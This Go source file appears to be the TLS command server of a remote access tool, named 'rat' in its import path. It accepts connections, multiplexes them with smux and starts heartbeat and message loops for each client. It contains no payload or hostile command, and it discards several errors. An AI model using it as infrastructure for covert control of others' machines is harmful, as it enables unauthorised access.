package main

import (
	"crypto/tls"
	"rat/command/log"

	"github.com/xtaci/smux"
)

// TLSServer is the default TCP server using TLS encryption
type TLSServer struct {
	Address string `json:"host"`
}

func (server TLSServer) Listen() error {
	// Load local keypair
	cert, _ := tls.LoadX509KeyPair("cert.pem", "private.key")
	config := tls.Config{Certificates: []tls.Certificate{cert}}

	// Spawn server
	listener, _ := tls.Listen("tcp", server.Address, &config)

	for {
		conn, err := listener.Accept()

		if err != nil {
			log.Println(err.Error())
			continue
		}

		session, err := smux.Server(conn, nil)
		client := NewClient(conn)
		if err != nil {
			panic(err)
		}

		control, err := session.OpenStream()
		if err != nil {
			panic(err)
		}

		client.session = session
		client.stream = control

		go client.recvLoop()
		go client.writeLoop()
		go client.Heartbeat()

		client.streamChan <- ChannelImpl{}
	}
}
